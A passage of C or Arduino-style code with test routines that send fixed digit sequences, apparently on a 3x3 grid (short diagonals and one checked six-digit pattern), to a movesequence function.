  int secuencia5[3] = {2,3,4};
  movesequence(secuencia5,3);
  int secuencia6[3] = {2,3,4};
  movesequence(secuencia6,3);
}

void testshortdiagonal(){
  int secuencia1[4] = {1,5,9,6};
  movesequence(secuencia1,4);
  int secuencia2[4] = {3,5,7,4};
  movesequence(secuencia2,4);
}

void testsecuencias(){
  int digit1 = 1;
  int digit2 = 5;
  int digit3 = 9;
  int digit4 = 8;
  int digit5 = 5;
  int digit6 = 2;
  int secuencia1[6] = {digit1,digit2,digit3,digit4,digit5,digit6};
  int test1 = validPattern(digit1,digit2,digit3,digit4,digit5,digit6,0,0,0,6);
  int test2 = distinto(digit1,digit2,digit3,digit4,digit5,digit6,0,0,0,6);
  if ((test1==1) and (test2==1)) {
  movesequence(secuencia1,6);
  }
}


/*
 * 
 * 
 * 
 * 
 *  
 * 
 * 
*/

